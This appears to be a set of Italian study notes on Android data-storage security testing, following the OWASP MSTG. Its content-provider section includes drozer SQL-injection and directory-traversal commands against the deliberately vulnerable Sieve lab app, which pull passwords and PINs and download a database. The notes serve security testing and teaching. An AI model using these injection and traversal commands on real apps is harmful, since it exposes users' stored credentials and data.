# Data Storage on Android

## Testing Local Storage for Sensitive Data (MSTG-STORAGE-1 and MSTG-STORAGE-2)

Le API di SharedPreferences sono di solito usate per memorizzare coppie chiave-valore.
I dati sono scritti in file XML in chiaro.
L'oggetto SharedPreferences può essere dichiarato accessibile a tutte le app o privato.
Il seguente codice crea un file key.xml.

```java
SharedPreferences sharedPref = getSharedPreferences("key", MODE_WORLD_READABLE);
SharedPreferences.Editor editor = sharedPref.edit();
editor.putString("username", "administrator");
editor.putString("password", "supersecret");
editor.commit();
```

Il contenuto del file è il seguente.

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
	<string name="username">administrator</string>
	<string name="password">supersecret</string>
</map>
```

Username e password sono memorizzati in chiaro, e `MODE_WORLD_READABLE` rende il file accessibile a tutte le app.

L'SDK Android supporta il database SQLite.
Tuttavia le informazioni sensibili non vanno memorizzate in database non cifrati, come nell'esempio che segue.

```java
SQLiteDatabase notSoSecure = openOrCreateDatabase("privateNotSoSecure",MODE_PRIVATE,null);
notSoSecure.execSQL("CREATE TABLE IF NOT EXISTS Accounts(Username VARCHAR, Password VARCHAR);");
notSoSecure.execSQL("INSERT INTO Accounts VALUES('admin','AdminPass');");
notSoSecure.close();
```

Usando la libreria SQLCipher, i database SQLite posson essere cifrati con password.

```java
SQLiteDatabase secureDB = SQLiteDatabase.openOrCreateDatabase(database, "password123", null);
secureDB.execSQL("CREATE TABLE IF NOT EXISTS Accounts(Username VARCHAR,Password VARCHAR);");
secureDB.execSQL("INSERT INTO Accounts VALUES('admin','AdminPassEnc');");
secureDB.close();
```

Tuttavia la password di cifratura non deve essere hard-coded nel codice sorgente, memorizzata nelle SharedPreferences, o nascosta altrove.
Si può:
chiedere all'utente di decifrare il database con un PIN o una password quando l'app viene aperta (password deboli e PIN sono vulnerabili ad attacchi di brute force) oppure
memorizzare la password in un server e consentirne l'accesso solo tramite un servizio web (in modo tale che l'app sia usabile solo quando il device è online).

Firebase offre un Real-time Database, che memorizza e sincronizza i dati con un database NoSQL cloud-based.
I dati sono memorizzati in un JSON e sincronizzati in real-time con ogni client e restano disponibili anche se l'app va offline.
Se il cloud server non è opportunamente configurato, potrebbe esporre informazioni sensibili.
Puoi usare [FireBaseScanner](https://github.com/shivsahni/FireBaseScanner) per verificare se l'APK presenta tale problema (`$ python FirebaseScanner.py -p my.apk`).

Il Realm Database per Java può essere cifrato con una chiave memorizzata nel file di configurazione.

```java
//the getKey() method either gets the key from the server or from a KeyStore, or is deferred from a password.
RealmConfiguration config = new RealmConfiguration.Builder()
	.encryptionKey(getKey())
	.build();
	
Realm realm = Realm.getInstance(config);
```

I dati salvati nell'internal storage sono accessibili solo dall'app che li ha creati e vengono rimossi quando l'app viene disinstallata.
Mentre i dati salvati su external storage (sia esso SD card o memoria interna del device) sono accedibili da qualsiasi app e rimangono anche dopo l'installazione dell'app.

### Static Analysis

- controlla i permessi di lettura/scrittura su external storage in AndroidManifest.xml (es. `uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"`)
- cerca nel codice sorgente `MODE_WORLD_READABLE `, `MODE_WORLD_WRITABLE`, `SharedPreferences`, `FileOutputStream`, `getExternal*`, `getWritableDatabase`, `getReadableDatabase`, `getCacheDir`, `getExternalCacheDirs`.

Controllare che non siano state applicate le seguenti bad practice:

- memorizzazione di informazioni sensibili "cifrandole" con operazioni quali XOR o bit flipping
- utilizzo di chiavi non derivate dal KeyStore
- utilizzo di chiavi hard-coded

Il Keystore Android supporta la memorizzazione di chiavi relativamente sicura.
Un'app può usare una chiave pubblica per creare una nuova coppia di chiavi pubblica/privata per cifrare i dati sensibili dell'app e decifrarli con la chiave privata.
Puoi proteggere le chiavi memorizzate nel KeyStore con l'autenticazione dell'utente.
Vengono usate le credenziali di blocco schermo (pattern, PIN, password o impronte digitali).
Puoi usare le chiavi memorizzate in due modi:

1. l'utente è autorizzato a usare le chiavi per un periodo di tempo limitato dopo l'autenticazione.
Tutte le chiavi possono essere usate non appena l'utente sblocca il device.
Questo modo è usabile solo se il blocco schermo è abilitato.
Quando il blocco schermo viene rimosso, tutte le chiavi diventano non valide.
2. l'utente è autorizzato a usare una specifica operazione crittografica che è associata con una chiave.
L'utente deve richiedere un'autorizzazione separata per ogni operazione che coinvolge la chiave.
Solo l'autenticazione tramite impronte digitali può essere usata in questo caso.

Il livello di sicurezza offerto dal KeyStore dipende dalla sua implementazione, che dipende dal device.
La maggior parte dei device moderni offrono un'implementazione hardware del KeyStore: le chiavi sono generate e usate nel TEE o SE, e il sistema operativo non può accedervi direttamente.
Quindi le chiavi non possono essere recuperate facilmente, neanche da un device rooted.

Le chiavi di un'implementazione solo software sono cifrate con una master key per utente.
Un attaccante può accedere a tutte le chiavi memorizzate su un device rooted in `/data/misc/keystore/`.
Dato che il pin/password del blocco schermo è usato per generare la master key, il KeyStore non è disponibile quando il device è bloccato.

\# TODO prova a estrarre le chiavi dal keystore

La classe KeyChain è usata per memorizzare e recuperare chiavi private e i loro corrispondenti certificati dal sistema.
All'utente sarà richiesto di impostare un PIN o una password per blocco schermo al fine di proteggere le credenziali se viene importato qualcosa nella KeyChain.
Qualsiasi app può accedere al materiale contenuto nella KeyChain.

Assicurati che l'app utilizzi i meccanismi di KeyStore e Cipher per memorizzare in modo sicuro informazioni sensibili sul device.
Cerca `AndroidKeystore`, `import java.security.KeyStore`, `import javax.crypto.Cipher`, `import java.security.SecureRandom`.
Verifica che venga usata la funzione `store(OutputStream stream, char[] password)` per memorizzare il KeyStore con una password.
Assicurati che la password non sia hard-coded ma fornita dall'utente.

Se le chiavi non sono memorizzate nel KeyStore, tramite un device rooted è sempre possibile estrarle.

### Dynamic Analysis

Installa e usa l'app invocando tutte le funzionalità almeno una volta.
Poi:

- individua i file di sviluppo, di backup, o vecchi che non dovrebbero essere inclusi in una release di produzione
- controlla se i database in `/data/data/<package-name>/databases` contengono informazioni sensibili
- controlla se le SharedPreferences in `/data/data/<package-name>/shared_prefs` contengono informazioni sensibili
- controlla i permessi sui file in `/data/data/<package-name>`.
Solo l'user e il group creati all'installazione dell'app dovrebbero avere permessi `rwx`.
Gli altri user non dovrebbero avere i permessi di accesso al file, ma potrebbero avere quelli `x` per le directory
- se è presente un Realm database in `/data/data/<package-name>/files/` controlla se contiene informazioni sensibili e se è cifrato
- controlla che i dati sensibili non siano stati salvati su external storage

## Testing Local Storage for Input Validation (MSTG-PLATFORM-2)

Per qualsiasi data storage accessibile pubblicamente, qualsiasi processo può sovrascrivere i dati.
È necessario fare input validation quando i dati vengono letti.

### Static Analysis

Quando usi `SharedPreferences.Editor` per leggere o scrivere i valori, non puoi verificare se sono stati sovrascritti o meno.
Difficilmente però può essere usato per gli attacchi a meno che non vengano cambiati i valori.
Se si legge una `String` o `StringSet` bisogna controllare come vengono interpretati i valori.
In qualsiasi caso, verificare l'HMAC sui dati letti aiuta a verificare eventuali modifiche.

Se sono usati altri meccanismi di storage pubblici, è necessario fare validazione dei valori letti.

## Testing Logs for Sensitive Data (MSTG-STORAGE-3)

È opportuno usare una classe e un meccanismo di logging centralizzato e rimuovere il logging verboso nelle release di produzione dato che altre app possono leggerlo.

### Static Analysis

Cerca nel codice sorgente:
`android.util.Log`,
`Log.d`,
`Log.e`,
`Log.i`,
`Log.v`,
`Log.w`,
`Log.wtf`,
`Logger`,
`System.out.print`,
`System.err.print`,
logfile,
logging,
logs.

Puoi usare Proguard per preparare la release di produzione.
Questo tool fa da shrinker, optimizer, obfuscator e preverifier.
Individua e rimuove classi, campi, metodi e attributi non usati e può anche essere usato per eliminare codice riguardante il logging.

### Dynamic Analysis

Installa e usa l'app invocando tutte le funzionalità almeno una volta.
Verifica se sono stati creati dei file di log in `/data/data/<package-name>`.
Una volta individuato il PID del processo dell'app, puoi filtrare l'output di logcat lanciando `$ adb logcat --pid <PID>`.
Se ti aspetti una certa stringa nel log puoi filtrare con `-e <expr>` o `--regex=<expr>`.

## Determining Whether Sensitive Data is Sent to Third Parties (MSTG-STORAGE-4)

Quando l'app usa servizi di terze parti, bisogna verificare che solo le informazioni necessarie e non sensibili siano inviate a tali servizi.
I servizi possono essere implementati tramite una libreria standalone Jar nell'APK) o una SDK completa.

### Static Analysis

Controlla i permessi inseriti in AndroidManifest.xml.
In particolare verifica se i permessi `READ_SMS`, `READ_CONTACTS`, `ACCESS_FINE_LOCATION` sono effettivamente necessari.
Tutti i dati inviati a servizi di terze parti dovrebbero essere anonimizzati.
I dati (come l'application ID) che può far risalire all'account o alla sessione utente non dovrebbe essere inviato a terze parti.

### Dynamic Analysis

Controlla se le chiamate a servizi esterni contengono informazioni sensibili, tramite l'uso di Burp Suite/OWASP ZAP.

## Determining Whether the Keyboard Cache Is Disabled for Text Input Fields (MSTG-STORAGE-5)

La keyboard cache è utile nelle app di messaggistica.
Ma in altri contesti potrebbe rilevare informazioni sensibili.

### Static Analysis

Nella definizione di un'activity, puoi definire le `TextViews`.
Se all'attributo `android:inputType` viene assegnato il valore `textNoSuggestions`, la keyboard cache non verrà mostrata quando l'input field viene selezionato.

```xml
<EditText
	android:id="@+id/KeyBoardCache"
	android:inputType="textNoSuggestions"/>
```

### Dynamic Analysis

Lancia l'app e inserisci del testo negli input che ricevono dati sensibili.
Se vengono ci sono dei suggerimenti, allora la keyboard cache non è stata disabilitata per questi campi.

## Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms (MSTG-STORAGE-6)

\# TODO riguarda

I content provider permettono di accedere e modificare dati di un'app ad altre.
Se non sono configurati adeguatamente, possono rilevare informazioni sensibili.

### Static Analysis

Cerca i content provider dichiarati in AndroidManifest.xml.
Verifica se è esportato (`android:exported="true"`).
Anche se non lo è, sarà tale se all'interno è dichiarato un `<intent-filter>`.
Se il contenuto è pensato per essere acceduto solo dall'app imposta `android:exported="false"`.
Se invece non lo è, definisci i permessi di lettura/scrittura appropriati.
Verifica se i dati sono protetti con `android:permission`.
Verifica se l'attributo `android:protectionLevel` ha il valore `signature`.
In questo modo i dati sono accedibili solo dalle app sviluppate dalla stessa azienda (firmate con la stessa chiave).
Per rendere i dati accessibili alle altre app, applica una security policy con l'elemento `<permission>` e imposta un adeguato `android:protectionLevel`.
Se si usa `android:permission`, le altre app devono dichiarare il corrispondente elemento `<uses-permission>` nel loro manifest per interagire con il content provider della tua app.
Puoi usare l'attributo `<android:grantUriPermissions>` per dare accesso specifico alle altre app, oppure puoi limitare l'accesso usando l'elemento `<grant-uri-permission>`.

Ispeziona il codice e cerca di capire in che modo il content provider deve essere usato.
Cerca parole chiave come:
`android.content.ContentProvider`,
`android.database.Cursor`,
`android.database.sqlite`,
`.query`,
`.update`,
`.delete`.
Se l'app espone un content provider, verifica se i metodi di query parametrizzate sono usate per prevenire SQL injection.
Assicurati che i parametri siano stati sanitizzati.

Il seguente estratto di un AndroidManifest.xml esporta due `<provider>`.
Il path `"/Keys"` è protetto da permessi di lettura e scrittura.

```xml
<provider android:authorities="com.mwr.example.sieve.DBContentProvider" android:exported="true" android:multipr
ocess="true" android:name=".DBContentProvider">
<path-permission android:path="/Keys" android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writ
ePermission="com.mwr.example.sieve.WRITE_KEYS"/>
</provider>
<provider android:authorities="com.mwr.example.sieve.FileBackupProvider" android:exported="true" android:multip
rocess="true" android:name=".FileBackupProvider"/>
```

In realtà sono attivi due path (`"Keys"`, `"/Passwords"`) e il secondo non è protetto, come si vede nel codice che segue.

```java
public Cursor query(final Uri uri, final String[] array, final String s, final String[] array2, final String s2)
{
	final int match = this.sUriMatcher.match(uri);
	final SQLiteQueryBuilder sqLiteQueryBuilder = new SQLiteQueryBuilder();
	
	if (match >= 100 && match < 200) {
		sqLiteQueryBuilder.setTables("Passwords");
	}
	else if (match >= 200) {
		sqLiteQueryBuilder.setTables("Key");
	}
	
	return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, (String)null, (String)null, s2);
}
```

### Dynamic Analysis

<!--
sieve.apk
master password: Mylongerpassword
master PIN: 2468
-->

Enumera la superficie d'attacco usando drozer:

	dz> run app.provider.info -a com.mwr.example.sieve
	
```
Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.mwr.example.sieve.DBContentProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: False
    Path Permissions:
      Path: /Keys
        Type: PATTERN_LITERAL
        Read Permission: com.mwr.example.sieve.READ_KEYS
        Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.mwr.example.sieve.FileBackupProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: False
```

Per identificare le URI dei content provider usa drozer:

```sh
dz> run scanner.provider.finduris -a com.mwr.example.sieve
```
	
```
Scanning com.mwr.example.sieve...
Unable to Query  content://com.mwr.example.sieve.DBContentProvider/
Unable to Query  content://com.mwr.example.sieve.FileBackupProvider/
Unable to Query  content://com.mwr.example.sieve.DBContentProvider
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords/
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Keys/
Unable to Query  content://com.mwr.example.sieve.FileBackupProvider
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords
Unable to Query  content://com.mwr.example.sieve.DBContentProvider/Keys

Accessible content URIs:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
	
Ottenute le URI prova a estrarre i dati:

```sh
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
```
	
```
     _id  1
 service  amazon.com
username  my-username
password  Su2BcNE5fofOONqpeLrLJQ9OsGQHZ3mrfqo/ (Base64-encoded)
   email  u@mail.com
```

Puoi anche eseguire insert, update e delete tramite drozer:

```sh
dz> run app.provider.insert content://com.vulnerable.im/messages
	--string date 1331769850325
	--string type 0
	--string _id 7

dz> run app.provider.update content://settings/secure
	--selection "name=?"
	--selection-args assisted_gps_enabled
	--integer value 0

dz> run app.provider.delete content://settings/secure
	--selection "name=?"
	--seelction-args my_settings
```

Puoi provare delle SQL injection tramite drozer:

```sh
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'" unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')

Puoi sfruttare una vulnerabilità di SQL injection per enumerare le tabelle dal database

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```
	
```
| type
| name
| tbl_name
| rootpage | sql
|
| table | android_metadata | android_metadata | 3 | CREATE TABLE ... |
| table | Passwords | Passwords | 4 | CREATE TABLE ... |
| table | Key | Key | 5 | CREATE TABLE ... |
```

Oppure per estrarre informazioni sensibili

```sh
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
```

```
| Password | pin |
| thisismypassword | 9876 |
```

Questo processo può essere automatizzato:

```sh
dz> run scanner.provider.injection -a com.mwr.example.sieve
```

I content provider possono fornire accesso anche al filesystem.
Ciò permette alle app di condividere i file (la sandbox Android di solito lo evita).
Questi content provider sono suscettibili a directory traversal.

```sh
dz> run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db
```

Puoi automatizzare la ricerca di content provider suscettibili a directory traversal:

```sh
dz> run scanner.provider.traversal -a com.mwr.example.sieve
```
	
```
Scanning com.mwr.example.sieve...
Not Vulnerable:
  content://com.mwr.example.sieve.DBContentProvider/
  content://com.mwr.example.sieve.DBContentProvider/Keys
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider

Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
```
	
Puoi usare anche `adb` per interrogare i content provider:

```sh
$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
```

## Checking for Sensitive Data Disclosure Through the User Interface (MSTG-STORAGE-7)

I dati sensibili inseriti dall'utente potrebbero essere esposti se non opportunamente mascherati dall'app, se mostrati in chiaro.

### Static Analysis

Verifica che per gli `EditText` di dati sensibili sia stato aggiunto l'attributo `android:inputType="textPassword"`.

### Dynamic Analysis

Usa l'app e identifica i componenti che ricevono input dall'utente.
Verifica che l'input di dati sensibili venga mascherato.

## Testing Backups for Sensitive Data (MSTG-STORAGE-8)

I backup contengono i dati e le impostazioni di tutte le app installate.
Il problema sussiste quando i backup contengono informazioni sensibili.

### Static Analysis

In AndroidManifest può essere attivato l'attributo `allowBackup` per consentire il backup di tutti i dati dell'app tramite `$ adb backup .`.
Se questo attributo non è presente, il valore di default è `true`.
Se il backup è abilitato, valuta se vengono salvati dati sensibili.

Nel caso di backup sincronizzati col cloud, determina
quali file vengono trasmessi,
quali file contengono dati sensibili,
se le informazioni sensibili sono cifrate prima di essere inviate.
Se in AndroidManifest.xml è presente l'attributo `android:fullBackupOnly` è attivo il backup automatico.
Se invece è presente l'attributo `android:backupAgent` è attivo il backup key/value, ma è necessario definire un backup agent.
Quindi cerca la classe che estende `BackupAgent` o `BackupAgentHelper`.

### Dynamic Analysis

Dopo aver eseguito tutte le funzioni dell'app disponibili, prova a fare il backup dell'app con `adb`.
Prova poi a ispezionare il backup per trovare informazioni sensibili.

```sh
$ adb backup -apk -nosystem <package-name>
```

Converti il backup `.ab` in `.tar`

```sh
$ dd if=mybackup.ab bs=24 skip=1|openssl zlib -d > mybackup.tar
```

Se ottieni l'errore `Invalid command 'zlib'; type "help" for a list.`

```sh
$ dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar
```

Un alternativa è Android Backup Extractor.

```sh
$ java -jar abe.jar unpack backup.ab
```

Estrai il backup dal file `tar` creato

```sh
$ tar xvf mybackup.tar
```
	
\# TODO prova backup di specifica app

167

